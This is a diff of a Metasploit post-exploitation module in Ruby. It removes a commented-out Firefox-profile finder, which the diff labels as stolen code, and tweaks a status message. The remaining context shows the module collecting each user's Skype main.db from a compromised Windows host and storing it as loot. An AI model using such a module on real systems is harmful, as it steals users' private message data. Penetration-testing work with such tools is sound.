@@ -49,98 +49,6 @@ class Metasploit3 < Msf::Post
 		grab_user_profiles().each do |user|
 			next if user['AppData'] == nil
 
-#SEARCH ALL SUBFOLDERS
- #       def check_firefox(path)
-#
- #               paths = []
-#
- #               path = path + "\\Mozilla\\"
-#
- #               print_status("Checking for Firefox directory in: #{path}")
-#
- #               stat = session.fs.file.stat(path + "Firefox\\profiles.ini") rescue nil
-#
- #               if !stat
-#
- #                       print_error("Firefox not found")
-#
- #                       return
-#
- #               end
-#
- #               session.fs.dir.foreach(path) do |fdir|
-#
- #                       if fdir =~ /Firefox/i and @platform == :windows
-#
- #                               paths << path + fdir + "Profiles\\"
-#
- #                               print_good("Found Firefox installed")
-#
- #                               break
-#
- #                       else
-#
- #                               paths << path + fdir
-#
- #                               print_status("Found Firefox installed")
-#
- #                               break
-#
- #                       end
-#
- #               end
-#
- #               if paths.empty?
-#
- #                       print_error("Firefox not found")
-#
- #                       return
-#
- #               end
-#
- #               print_status("Locating Firefox Profiles...")
-#
- #               print_line("")
-#
- #               path += "Firefox\\Profiles\\"
-#
- #               # we should only have profiles in the Profiles directory store them all
-#
- #               begin
-#
- #                       session.fs.dir.foreach(path) do |pdirs|
-#
- #                               next if pdirs == "." or pdirs == ".."
-#
- #                               print_good("Found Profile #{pdirs}")
-#
- #                               paths << path + pdirs
-#
- #                       end
-#
- #               rescue
-#
- #                       print_error("Profiles directory missing")
-#
- #                       return
-#
- #               end
-#
- #               if paths.empty?
-#
- #                       return nil
-#
-#                else
-#
-#                        return paths
-#
-#               end
-#
-#        end
-#END STOLEN CODE
-
-
-
 
 			tmpath= user['AppData'] + "\\skype\\" + skype_username + "\\main.db"
 			grab_skype(tmpath)
@@ -165,7 +73,7 @@ class Metasploit3 < Msf::Post
 			end
 
 			store_loot("main.db", "application/octet-stream", session, data, filename, "Skype DB File")
-			print_status("All done.  It was a pleasure to serve you.")
+			print_status("All done.  It was a pleasure to serve you, Sir!.")
 		rescue ::Interrupt
 			raise $!
 		rescue ::Exception => e
